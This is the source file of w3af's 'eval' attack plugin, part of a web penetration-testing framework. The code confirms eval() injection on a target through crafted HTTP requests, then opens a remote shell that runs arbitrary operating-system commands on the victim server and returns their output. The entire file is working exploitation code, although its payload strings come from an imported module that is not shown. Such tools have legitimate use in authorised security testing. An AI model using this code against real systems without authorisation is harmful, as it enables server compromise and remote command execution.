"""
eval.py

Copyright 2009 Andres Riancho

This file is part of w3af, http://w3af.org/ .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

"""
import w3af.core.controllers.output_manager as om
import w3af.plugins.attack.payloads.shell_handler as shell_handler

from w3af.core.controllers.plugins.attack_plugin import AttackPlugin
from w3af.core.controllers.exceptions import BaseFrameworkException
from w3af.core.data.kb.exec_shell import ExecShell
from w3af.plugins.attack.payloads.decorators.exec_decorator import exec_debug


class eval(AttackPlugin):
    """
    Exploit eval() vulnerabilities.

    :author: Andres Riancho (andres.riancho@gmail.com)
    """

    def __init__(self):
        AttackPlugin.__init__(self)

        # Internal variables
        self._shellcode_generator = None

    def get_attack_type(self):
        """
        :return: The type of exploit, SHELL, PROXY, etc.
        """
        return 'shell'

    def get_kb_location(self):
        """
        This method should return the vulnerability name (as saved in the kb)
        to exploit. For example, if the audit.os_commanding plugin finds an
        vuln, and saves it as:

        kb.kb.append( 'os_commanding' , 'os_commanding', vuln )

        Then the exploit plugin that exploits os_commanding
        ( attack.os_commanding ) should return 'os_commanding' in this method.
        """
        return ['eval']

    def _generate_shell(self, vuln_obj):
        """
        :param vuln_obj: The vuln to exploit.
        :return: A shell object based on the vuln that is passed as parameter.
        """
        # Check if we really can execute commands on the remote server
        if self._verify_vuln(vuln_obj):
            # Create the shell object
            shell_obj = EvalShell(vuln_obj, self._uri_opener, self.worker_pool,
                                  self._shellcode_generator)
            return shell_obj
        else:
            return None

    def _verify_vuln(self, vuln_obj):
        """
        This command verifies a vuln. This is really hard work!

        :param vuln_obj: The vulnerability to exploit.
        :return : True if vuln can be exploited.
        """
        # Get the shells
        extension = vuln_obj.get_url().get_extension()

        # I get a list of tuples with code and extension to use
        null_command = ''
        shell_code_list = shell_handler.get_shell_code(extension, null_command)

        for code, real_extension, shellcode_generator in shell_code_list:
            # Prepare for exploitation...
            mutant = vuln_obj.get_mutant()
            mutant = mutant.copy()
            mutant.set_token_value(code)

            try:
                http_res = self._uri_opener.send_mutant(mutant)
            except BaseFrameworkException, w3:
                msg = 'An error occurred while trying to exploit the eval()'\
                      ' vulnerability. Original exception: "%s".'
                om.out.debug(msg % w3)
            else:
                if shell_handler.SHELL_IDENTIFIER in http_res.get_body():
                    msg = 'Successfully exploited eval() vulnerability using'\
                          ' the following code snippet: "%s...".' % code[:35]
                    om.out.debug(msg)
                    self._shellcode_generator = shellcode_generator
                    return True

        # All failed!
        return False

    def get_root_probability(self):
        """
        :return: This method returns the probability of getting a root shell
                 using this attack plugin. This is used by the "exploit *"
                 function to order the plugins and first try to exploit the
                 more critical ones. This method should return 0 for an exploit
                 that will never return a root shell, and 1 for an exploit that
                 WILL ALWAYS return a root shell.
        """
        return 0.8

    def get_long_desc(self):
        """
        :return: A DETAILED description of the plugin functions and features.
        """
        return """
        This plugin exploits eval() vulnerabilities and returns a remote shell.
        """


class EvalShell(ExecShell):

    def __init__(self, vuln, uri_opener, worker_pool, shellcode_generator):
        super(EvalShell, self).__init__(vuln, uri_opener, worker_pool)
        
        self.shellcode_generator = shellcode_generator
        
    @exec_debug
    def execute(self, command):
        """
        This method executes a command in the remote operating system by
        exploiting the vulnerability.

        :param command: The command to handle ( ie. "ls", "whoami", etc ).
        :return: The result of the command.
        """
        # Lets send the command.
        mutant = self.get_mutant()
        mutant = mutant.copy()
        mutant.set_token_value(self.shellcode_generator(command))

        try:
            response = self._uri_opener.send_mutant(mutant)
        except BaseFrameworkException, w3:
            msg = 'An error occurred while trying to exploit the eval()'\
                  ' vulnerability (sending command %s). Original exception:' \
                  ' "%s".'
            om.out.debug(msg % (command, w3))
            return 'Unexpected error, please try again.'
        else:
            return shell_handler.extract_result(response.get_body())

    def get_name(self):
        return 'eval_shell'

    def __reduce__(self):
        """
        Need to define this method since the Shell class defines it, and we have
        a different number of __init__ parameters.
        """
        return self.__class__, (self._vuln, None, None, self.shellcode_generator)